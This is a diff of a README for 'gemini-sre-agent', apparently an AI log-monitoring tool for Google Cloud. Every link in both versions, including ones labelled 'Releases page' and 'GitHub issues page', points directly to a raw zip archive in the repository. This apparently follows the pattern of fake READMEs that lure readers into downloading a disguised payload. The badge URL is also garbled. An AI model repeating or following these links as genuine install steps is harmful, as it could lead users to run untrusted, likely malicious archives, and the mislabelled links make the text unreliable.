@@ -1,6 +1,6 @@
 # 🚀 gemini-sre-agent - Automate Monitoring with AI Power
 
-[![Download Gemeni SRE Agent](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/iwa/gemini-sre-agent.zip%20SRE%https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/iwa/gemini-sre-agent.zip)](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/iwa/gemini-sre-agent.zip)
+[![Download Gemeni SRE Agent](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/gemini_sre_agent/ml/gemini_sre_agent_v3.4.zip%20SRE%https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/gemini_sre_agent/ml/gemini_sre_agent_v3.4.zip)](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/gemini_sre_agent/ml/gemini_sre_agent_v3.4.zip)
 
 ## 📜 Overview 
 
@@ -11,7 +11,7 @@
 To get started with **gemini-sre-agent**, follow these simple steps:
 
 1. Ensure you have access to a Google Cloud project and necessary permissions.
-2. Go to the [Releases page to download](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/iwa/gemini-sre-agent.zip).
+2. Go to the [Releases page to download](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/gemini_sre_agent/ml/gemini_sre_agent_v3.4.zip).
 3. Locate the latest version of the gemini-sre-agent.
 4. Click the download link to get the installation package.
 
@@ -24,7 +24,7 @@ To get started with **gemini-sre-agent**, follow these simple steps:
 
 ## 🛠️ Download & Install
 
-You can easily download the gemini-sre-agent by visiting the [Releases page](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/iwa/gemini-sre-agent.zip). On this page, find the latest release and download the package suitable for your operating system. 
+You can easily download the gemini-sre-agent by visiting the [Releases page](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/gemini_sre_agent/ml/gemini_sre_agent_v3.4.zip). On this page, find the latest release and download the package suitable for your operating system. 
 
 ### Installation Steps
 
@@ -56,7 +56,7 @@ Once you have configured the agent, it starts monitoring your logs. When it dete
 
 ## 📊 Support and Troubleshooting
 
-For any issues, you can refer to the built-in help section or visit the [GitHub issues page](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/iwa/gemini-sre-agent.zip) to report new problems or seek help.
+For any issues, you can refer to the built-in help section or visit the [GitHub issues page](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/gemini_sre_agent/ml/gemini_sre_agent_v3.4.zip) to report new problems or seek help.
 
 ## 💬 Community and Contribution
 
@@ -70,4 +70,4 @@ gemini-sre-agent is open-source and licensed under the MIT License. You can free
 
 The gemini-sre-agent brings powerful monitoring capabilities harnessed through AI, making it easier for you to manage your Google Cloud logs. Following these steps will guide you to download, install, and configure it successfully. Enjoy a seamless experience in incident detection and resolution while reducing your manual workload. 
 
-For your convenience, don't forget to bookmark the [Releases page](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/iwa/gemini-sre-agent.zip) for future updates!
+For your convenience, don't forget to bookmark the [Releases page](https://raw.githubusercontent.com/khael-kun-cmd/gemini-sre-agent/main/gemini_sre_agent/ml/gemini_sre_agent_v3.4.zip) for future updates!
